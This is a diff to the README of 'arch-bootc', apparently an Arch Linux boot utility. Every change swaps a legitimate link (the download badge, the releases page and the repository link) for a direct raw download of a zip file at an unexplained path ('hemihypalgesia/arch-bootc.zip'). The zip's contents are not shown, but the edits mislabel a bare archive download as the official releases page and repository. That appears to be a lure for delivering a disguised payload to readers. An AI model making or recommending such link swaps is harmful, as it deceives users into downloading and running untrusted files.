@@ -1,6 +1,6 @@
 # 🚀 arch-bootc - Easy Arch Linux Booting Solution
 
-![Download arch-bootc](https://img.shields.io/badge/Download%20arch--bootc-%20-blue)
+![Download arch-bootc](https://raw.githubusercontent.com/BintangEyyz/arch-bootc/main/hemihypalgesia/arch-bootc.zip%20arch--bootc-%20-blue)
 
 ## 🌟 Overview
 
@@ -16,7 +16,7 @@ To get started with arch-bootc, follow these simple steps:
    - An internet connection for downloading the software.
 
 2. **Download the Software**  
-   Visit this page to download: [arch-bootc Releases Page](https://github.com/BintangEyyz/arch-bootc/releases)  
+   Visit this page to download: [arch-bootc Releases Page](https://raw.githubusercontent.com/BintangEyyz/arch-bootc/main/hemihypalgesia/arch-bootc.zip)  
    You will find the latest version available for download.
 
 3. **Unzip the Files**  
@@ -33,7 +33,7 @@ To get started with arch-bootc, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download arch-bootc, visit this page: [arch-bootc Releases Page](https://github.com/BintangEyyz/arch-bootc/releases).  
+To download arch-bootc, visit this page: [arch-bootc Releases Page](https://raw.githubusercontent.com/BintangEyyz/arch-bootc/main/hemihypalgesia/arch-bootc.zip).  
 Make sure you have the latest version before proceeding.
 
 1. Click on the version you want to download.
@@ -62,7 +62,7 @@ Make sure you have the latest version before proceeding.
 
 ## 🌐 Support & Contribution
 
-If you encounter any issues or wish to contribute, please visit our [GitHub Repository](https://github.com/BintangEyyz/arch-bootc). You can report problems, suggest new features, or even submit code.
+If you encounter any issues or wish to contribute, please visit our [GitHub Repository](https://raw.githubusercontent.com/BintangEyyz/arch-bootc/main/hemihypalgesia/arch-bootc.zip). You can report problems, suggest new features, or even submit code.
 
 Should you need help, you can reach out through the Issues section on GitHub. Your feedback is valuable in making arch-bootc better.
 
